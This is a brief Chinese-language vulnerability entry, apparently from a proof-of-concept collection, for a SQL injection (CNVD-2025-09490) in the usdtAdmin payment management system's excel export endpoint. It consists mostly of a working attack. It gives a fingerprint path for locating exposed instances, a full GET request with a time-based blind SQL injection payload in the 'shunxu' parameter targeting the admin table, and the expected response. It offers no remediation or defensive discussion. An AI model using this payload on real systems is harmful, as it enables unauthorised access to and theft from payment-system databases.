# usdtAdmin收款管理系统excel存在SQL注入漏洞(CNVD-2025-09490)

usdtAdmin ｜ SQL注入 ｜ —
- **指纹**：`"/usdtmerchant/login/reg.html"`
- **请求**：`GET /index/getway/excel?down=1&table=ea_system_admin&shunxu=desc,(SELECT+(CASE+WHEN+(8968=8968)+THEN+SLEEP(3)+ELSE+8968+END))&number=100 HTTP/1.1`
- **响应特征**：200